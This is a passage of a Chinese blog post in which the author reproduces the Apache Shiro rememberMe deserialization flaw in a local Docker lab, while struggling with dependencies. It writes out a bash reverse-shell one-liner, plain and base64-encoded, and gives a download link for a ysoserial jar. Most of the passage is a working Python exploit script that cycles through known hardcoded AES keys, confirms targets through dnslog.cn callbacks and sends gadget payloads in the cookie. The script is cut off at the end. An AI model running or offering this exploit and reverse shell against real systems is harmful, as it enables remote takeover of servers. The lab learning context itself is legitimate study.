+<p>然后添加国内源</p>
+<p>尝试执行conda install pycrypto</p>
+<p>然后那个小竖线一直在转 它在转我在等，结果到底是什么</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2022/png/640657/1648173749532-0f249afc-35be-42e1-a9ca-d19dc6c3ded7.png" alt="img"></p>
+<p>进行到这里的时候，有大佬发过来一个网站，欣喜若狂</p>
+<p><a target="_blank" rel="noopener" href="https://web.archive.org/web/20210709153323/http://www.voidspace.org.uk/python/pycrypto-2.6.1/">https://web.archive.org/web/20210709153323/http://www.voidspace.org.uk/python/pycrypto-2.6.1/</a></p>
+<p>起因是pycrypto安装不上吗，</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2022/png/640657/1648175105300-d1e1e068-08f0-4c78-a498-0ac13426a57c.png" alt="img"></p>
+<p>然后一直搜索搜到了个<a target="_blank" rel="noopener" href="http://www.voidspace.org.uk/python/pycrypto-2.6.1/">http://www.voidspace.org.uk/python/pycrypto-2.6.1/</a></p>
+<p>这个网站，访问了之后，挂掉了。。。</p>
+<p>然后大佬发来了个那个站好像挂了，这里可以访问历史页面</p>
+<p>然后点击下载,我也不知道下哪个 随便选选中了这个</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2022/png/640657/1648174199213-5fd0fa0a-e7bb-450b-bacc-779ebb8fe0c9.png" alt="img"></p>
+<p>下载安装— 在重新打开个命令行 在尝试执行脚本</p>
+<p>python2 shiro_exploit.py -t 3 -u <a target="_blank" rel="noopener" href="http://127.0.0.1:9090/doLogin">http://127.0.0.1:9090/doLogin</a> -p “bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTAxLzY2NjYgMD4mMQ&#x3D;&#x3D;}|{base64,-d}|{bash,-i}”</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2022/png/640657/1648174363668-c5562319-103f-4cb3-ad38-18e90a51ae3a.png" alt="img"></p>
+<p>好像好了，他不在报依赖的问题了，他开始报代码的问题了</p>
+<p>遂，查询代码看看，他可能是下面那个jar包没有找到，换成我之前工具的名字，ysoserial-master-SNAPSHOT.jar在尝试执行。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2022/png/640657/1648174426075-535a0b8e-97f4-4698-bb16-fbf4da498330.png" alt="img"></p>
+<hr>
+<p>重新尝试执行脚本</p>
+<p>因为到公司了ip换了 我重新测试nc可不可以联通</p>
+<p>客户机监听6666端口</p>
+<p>ifconfig 查询ip</p>
+<p>nc -lvp 6666</p>
+<p>docker中的环境尝试反弹shell</p>
+<p>bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.1.101&#x2F;6666 0&gt;&amp;1</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2022/png/640657/1648171993485-32ce2386-d75d-40e6-9efc-86f645bb51b8.png" alt="img"><img src="https://cdn.nlark.com/yuque/0/2022/png/640657/1648171979502-1895c635-70d8-439e-a026-2c07f603bc4d.png" alt="img"></p>
+<p>看到已经可以反弹shell了</p>
+<p>重新命令编码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &#123;<span class="built_in">echo</span>,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTAxLzY2NjYgMD4mMQ==&#125;|&#123;<span class="built_in">base64</span>,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure>
+
+<p>目标机器监听 nc -lvp 6666</p>
+<p>完整命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 shiro_exploit.py -t 3 -u http://127.0.0.1:9090 -p <span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTAxLzY2NjYgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>需要等一会，然后成功反弹shell</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2022/png/640657/1648175295272-ce499d3d-b42e-4902-8ab0-531b63ee8e79.png" alt="img"></p>
+<p>跟docker的id是一样的</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2022/png/640657/1648175354300-95cb7ca9-5cee-467f-91f7-ccdce0e111e1.png" alt="img"></p>
+<p>我理解的原理</p>
+<p>他本质的原因是cookie有个rememberMe的参数，他出现了个问题什么问题呢，他本身的作用就是为了记住密码的，然后下一次打开浏览器就会直接读取rememberMe的值，这是他本身的逻辑，然后缺陷在与他本身的密码是硬编码的，然后他的算法也是可以被拆解的，我们通过他原本的算法（序列化+使用密钥aes+base64）加上硬编码的密钥就可以得到这个rememberMe的值了，然后通过脚本加反序列化利用工具yso就可以成功的反弹shell了。</p>
+<p>然后还不明确的点是反序列化，和yso反序列化工具的作用把。可能后面理解了再来补充，然后自己生成的rememberme的值没有执行成功，还不懂怎么发送cookie，等学会了在来试试把。</p>
+<hr>
+<p>大佬发的ysoserial-master-SNAPSHOT.jar</p>
+<p>链接: <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1qf2rG1SOUWvDc-rMrT3m4A?pwd=dszf">https://pan.baidu.com/s/1qf2rG1SOUWvDc-rMrT3m4A?pwd=dszf</a> 提取码: dszf 复制这段内容后打开百度网盘手机App，操作更方便哦</p>
+<p><strong>脚本</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! python2.7</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">JAR_FILE = <span class="string">&#x27;ysoserial-master-SNAPSHOT.jar&#x27;</span></span><br><span class="line"></span><br><span class="line">CipherKeys = [</span><br><span class="line">    <span class="string">&quot;4AvVhmFLUs0KTA3Kprsdag==&quot;</span>,</span><br><span class="line">    <span class="string">&quot;3AvVhmFLUs0KTA3Kprsdag==&quot;</span>,</span><br><span class="line">    <span class="string">&quot;2AvVhdsgUs0FSA3SDFAdag==&quot;</span>,</span><br><span class="line">    <span class="string">&quot;6ZmI6I2j5Y+R5aSn5ZOlAA==&quot;</span>,</span><br><span class="line">    <span class="string">&quot;wGiHplamyXlVB11UXWol8g==&quot;</span>,</span><br><span class="line">    <span class="string">&quot;cmVtZW1iZXJNZQAAAAAAAA==&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Z3VucwAAAAAAAAAAAAAAAA==&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ZnJlc2h6Y24xMjM0NTY3OA==&quot;</span>,</span><br><span class="line">    <span class="string">&quot;L7RioUULEFhRyxM7a2R/Yg==&quot;</span>,</span><br><span class="line">    <span class="string">&quot;RVZBTk5JR0hUTFlfV0FPVQ==&quot;</span>,</span><br><span class="line">    <span class="string">&quot;fCq+/xW488hMTCD+cmJ3aQ==&quot;</span>,</span><br><span class="line">    <span class="string">&quot;WkhBTkdYSUFPSEVJX0NBVA==&quot;</span>,</span><br><span class="line">    <span class="string">&quot;1QWLxg+NYmxraMoxAXu/Iw==&quot;</span>,</span><br><span class="line">    <span class="string">&quot;WcfHGU25gNnTxTlmJMeSpw==&quot;</span>,</span><br><span class="line">    <span class="string">&quot;a2VlcE9uR29pbmdBbmRGaQ==&quot;</span>,</span><br><span class="line">    <span class="string">&quot;bWluZS1hc3NldC1rZXk6QQ==&quot;</span>,</span><br><span class="line">    <span class="string">&quot;5aaC5qKm5oqA5pyvAAAAAA==&quot;</span>,</span><br><span class="line">    <span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>,</span><br><span class="line">    <span class="comment">#&quot;ZWvohmPdUsAWT3=KpPqda&quot;,</span></span><br><span class="line">    <span class="string">&quot;r0e3c16IdVkouZgk1TKVMg==&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ZUdsaGJuSmxibVI2ZHc9PQ==&quot;</span>,</span><br><span class="line">    <span class="string">&quot;U3ByaW5nQmxhZGUAAAAAAA==&quot;</span>,</span><br><span class="line">    <span class="string">&quot;LEGEND-CAMPUS-CIPHERKEY==&quot;</span></span><br><span class="line">    <span class="comment">#&quot;kPv59vyqzj00x11LXJZTjJ2UHW48jzHN&quot;,</span></span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">gadgets = [<span class="string">&quot;JRMPClient&quot;</span>,<span class="string">&quot;BeanShell1&quot;</span>,<span class="string">&quot;Clojure&quot;</span>,<span class="string">&quot;CommonsBeanutils1&quot;</span>,<span class="string">&quot;CommonsCollections1&quot;</span>,<span class="string">&quot;CommonsCollections2&quot;</span>,<span class="string">&quot;CommonsCollections3&quot;</span>,<span class="string">&quot;CommonsCollections4&quot;</span>,<span class="string">&quot;CommonsCollections5&quot;</span>,<span class="string">&quot;CommonsCollections6&quot;</span>,<span class="string">&quot;CommonsCollections7&quot;</span>,<span class="string">&quot;Groovy1&quot;</span>,<span class="string">&quot;Hibernate1&quot;</span>,<span class="string">&quot;Hibernate2&quot;</span>,<span class="string">&quot;JSON1&quot;</span>,<span class="string">&quot;JavassistWeld1&quot;</span>,<span class="string">&quot;Jython1&quot;</span>,<span class="string">&quot;MozillaRhino1&quot;</span>,<span class="string">&quot;MozillaRhino2&quot;</span>,<span class="string">&quot;Myfaces1&quot;</span>,<span class="string">&quot;ROME&quot;</span>,<span class="string">&quot;Spring1&quot;</span>,<span class="string">&quot;Spring2&quot;</span>,<span class="string">&quot;Vaadin1&quot;</span>,<span class="string">&quot;Wicket1&quot;</span>]</span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">genpayload</span>(<span class="params">params, CipherKey,fp</span>):</span><br><span class="line">    gadget,command = params</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(fp):</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;jar file not found&#x27;</span>)</span><br><span class="line">    popen = subprocess.Popen([<span class="string">&#x27;java&#x27;</span>,<span class="string">&#x27;-jar&#x27;</span>,fp,gadget,command],</span><br><span class="line">                            stdout=subprocess.PIPE)</span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    <span class="comment">#print(command)</span></span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()</span><br><span class="line">    <span class="comment">#key = &quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span></span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line">    iv = uuid.uuid4().<span class="built_in">bytes</span></span><br><span class="line">    encryptor = AES.new(base64.b64decode(CipherKey), mode, iv)</span><br><span class="line">    file_body = pad(popen.stdout.read())</span><br><span class="line">    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    <span class="keyword">return</span> base64_ciphertext</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getdomain</span>():</span><br><span class="line">    <span class="keyword">try</span> :</span><br><span class="line">        ret = session.get(<span class="string">&quot;http://www.dnslog.cn/getdomain.php?t=&quot;</span>+<span class="built_in">str</span>(random.randint(<span class="number">100000</span>,<span class="number">999999</span>)),timeout=<span class="number">10</span>).text</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;getdomain error:&quot;</span> + <span class="built_in">str</span>(e))</span><br><span class="line">        ret = <span class="string">&quot;error&quot;</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getrecord</span>():</span><br><span class="line">    <span class="keyword">try</span> :</span><br><span class="line">        ret = session.get(<span class="string">&quot;http://www.dnslog.cn/getrecords.php?t=&quot;</span>+<span class="built_in">str</span>(random.randint(<span class="number">100000</span>,<span class="number">999999</span>)),timeout=<span class="number">10</span>).text</span><br><span class="line">        <span class="comment">#print(ret)</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;getrecord error:&quot;</span> + <span class="built_in">str</span>(e))</span><br><span class="line">        ret = <span class="string">&quot;error&quot;</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;://&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> url:</span><br><span class="line">        target = <span class="string">&#x27;https://%s&#x27;</span> % url <span class="keyword">if</span> <span class="string">&#x27;:443&#x27;</span> <span class="keyword">in</span> url <span class="keyword">else</span> <span class="string">&#x27;http://%s&#x27;</span> % url</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        target = url</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;checking url:&quot;</span> + url)</span><br><span class="line"></span><br><span class="line">    domain = getdnshost()</span><br><span class="line">    <span class="keyword">if</span> domain:</span><br><span class="line">        reversehost = <span class="string">&quot;http://&quot;</span> + domain</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> CipherKey <span class="keyword">in</span> CipherKeys:</span><br><span class="line">            ret = &#123;<span class="string">&quot;vul&quot;</span>:<span class="literal">False</span>,<span class="string">&quot;CipherKey&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;url&quot;</span>:target&#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;try CipherKey :&quot;</span> +CipherKey)</span><br><span class="line"></span><br><span class="line">                payload = genpayload((<span class="string">&quot;URLDNS&quot;</span>,reversehost),CipherKey,JAR_FILE)</span><br><span class="line"></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;generator payload done.&quot;</span>)</span><br><span class="line"></span><br><span class="line">                r = requests.get(target,cookies=&#123;<span class="string">&#x27;rememberMe&#x27;</span>: payload.decode()&#125;,timeout=<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;send payload ok.&quot;</span>)</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">5</span>):</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;checking.....&quot;</span>)</span><br><span class="line"></span><br><span class="line">                    time.sleep(<span class="number">2</span>)</span><br><span class="line">                    temp = getrecord()</span><br><span class="line">                    <span class="keyword">if</span> domain <span class="keyword">in</span> temp:</span><br><span class="line">                        ret[<span class="string">&quot;vul&quot;</span>] = <span class="literal">True</span></span><br><span class="line">                        ret[<span class="string">&quot;CipherKey&quot;</span>] = CipherKey</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="built_in">print</span>(<span class="built_in">str</span>(e))</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">if</span> ret[<span class="string">&quot;vul&quot;</span>]:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;get dns host error&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>(<span class="params">url,gadget,params,CipherKey</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;://&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> url:</span><br><span class="line">        target = <span class="string">&#x27;https://%s&#x27;</span> % url <span class="keyword">if</span> <span class="string">&#x27;:443&#x27;</span> <span class="keyword">in</span> url <span class="keyword">else</span> <span class="string">&#x27;http://%s&#x27;</span> % url</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        target = url</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        payload = genpayload((gadget, params),CipherKey,JAR_FILE)</span><br><span class="line">        r = requests.get(target,cookies=&#123;<span class="string">&#x27;rememberMe&#x27;</span>: payload.decode()&#125;,timeout=<span class="number">10</span>)</span><br><span class="line">        <span class="built_in">print</span>(r.text)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;exploit error:&quot;</span> + <span class="built_in">str</span>(e))</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getdnshost</span>():</span><br><span class="line">    reversehost = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span> :</span><br><span class="line">        domain = getdomain()</span><br><span class="line">        <span class="keyword">if</span> domain==<span class="string">&quot;error&quot;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;getdomain error&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment">#reversehost = &quot;http://&quot; +domain</span></span><br><span class="line">            reversehost = domain</span><br><span class="line">            <span class="comment">#print(&quot;got reversehost : &quot; + reversehost)</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> reversehost</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">detector</span>(<span class="params">url,CipherKey,command</span>):</span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;://&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> url:</span><br><span class="line">        target = <span class="string">&#x27;https://%s&#x27;</span> % url <span class="keyword">if</span> <span class="string">&#x27;:443&#x27;</span> <span class="keyword">in</span> url <span class="keyword">else</span> <span class="string">&#x27;http://%s&#x27;</span> % url</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        target = url</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">for</span> g <span class="keyword">in</span> gadgets:</span><br><span class="line">            g = g.strip()</span><br><span class="line"></span><br><span class="line">            domain = getdnshost()</span><br><span class="line">            <span class="keyword">if</span> domain:</span><br><span class="line">                <span class="keyword">if</span> g == <span class="string">&quot;JRMPClient&quot;</span>:</span><br><span class="line">                    param = <span class="string">&quot;%s:80&quot;</span> % domain</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    param = command.replace(<span class="string">&quot;&#123;dnshost&#125;&quot;</span>,domain)</span><br><span class="line">                payload = genpayload((g, param),CipherKey,JAR_FILE)</span><br><span class="line">                <span class="built_in">print</span>(g + <span class="string">&quot; testing.....&quot;</span>)</span><br><span class="line">                r = requests.get(target,cookies=&#123;<span class="string">&#x27;rememberMe&#x27;</span>: payload.decode()&#125;,timeout=<span class="number">10</span>)</span><br><span class="line">                <span class="comment">#print(r.read())</span></span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">5</span>):</span><br><span class="line">                    <span class="comment">#print(&quot;checking.....&quot;)</span></span><br><span class="line">                    time.sleep(<span class="number">2</span>)</span><br><span class="line">                    temp = getrecord()</span><br><span class="line">                    <span class="keyword">if</span> domain <span class="keyword">in</span> temp:</span><br><span class="line">                        ret = g</span><br><span class="line">                        <span class="comment">#ret[&quot;CipherKey&quot;] = CipherKey</span></span><br><span class="line">                        result.append(ret)</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&quot;found gadget:\t&quot;</span> + g)</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;get dns host error&quot;</span>)</span><br><span class="line">                    <span class="comment">#break</span></span><br><span class="line">        <span class="comment">#print(r.text)</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;detector error:&quot;</span> + <span class="built_in">str</span>(e))</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parser_error</span>(<span class="params">errmsg</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Usage: python &quot;</span> + sys.argv[<span class="number">0</span>] + <span class="string">&quot; [Options] use -h for help&quot;</span>)</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_args</span>():</span><br><span class="line">    <span class="comment"># parse the arguments</span></span><br><span class="line">    parser = argparse.ArgumentParser(epilog=<span class="string">&quot;\tExample: \r\npython &quot;</span> + sys.argv[<span class="number">0</span>] + <span class="string">&quot; -u target&quot;</span>)</span><br><span class="line">    parser.error = parser_error</span><br><span class="line">    parser._optionals.title = <span class="string">&quot;OPTIONS&quot;</span></span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-u&#x27;</span>, <span class="string">&#x27;--url&#x27;</span>, <span class="built_in">help</span>=<span class="string">&quot;Target url.&quot;</span>, default=<span class="string">&quot;http://127.0.0.1:8080&quot;</span>,required=<span class="literal">True</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-t&#x27;</span>, <span class="string">&#x27;--type&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;Check or Exploit. Check :1 , Exploit:2 , Find gadget:3&#x27;</span>, default=<span class="string">&quot;1&quot;</span>,required=<span class="literal">False</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-g&#x27;</span>, <span class="string">&#x27;--gadget&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;gadget&#x27;</span>, default=<span class="string">&quot;CommonsCollections2&quot;</span>,required=<span class="literal">False</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-p&#x27;</span>, <span class="string">&#x27;--params&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;gadget params&#x27;</span>,default=<span class="string">&quot;whoami&quot;</span>,required=<span class="literal">False</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-k&#x27;</span>, <span class="string">&#x27;--key&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;CipherKey&#x27;</span>,default=<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>,required=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">return</span> parser.parse_args()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    args = parse_args()</span><br><span class="line">    url = args.url</span><br><span class="line">    <span class="built_in">type</span> = args.<span class="built_in">type</span></span><br><span class="line">    command = args.params</span><br><span class="line">    key = args.key</span><br><span class="line">    gadget = args.gadget</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span>==<span class="string">&quot;1&quot;</span>:</span><br><span class="line">        r = check(url)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\nvulnerable:%s url:%s\tCipherKey:%s\n&quot;</span> %(<span class="built_in">str</span>(r[<span class="string">&quot;vul&quot;</span>]),url,r[<span class="string">&quot;CipherKey&quot;</span>]))</span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">type</span>==<span class="string">&quot;2&quot;</span>:</span><br><span class="line">        exploit(url,gadget,command,key)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;exploit done.&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">type</span>==<span class="string">&quot;3&quot;</span>:</span><br><span class="line">        </span><br><span class="line">        r = detector(url,key,command)</span><br><span class="line">        <span class="keyword">if</span> r :</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;found gadget:\n&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(r)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span 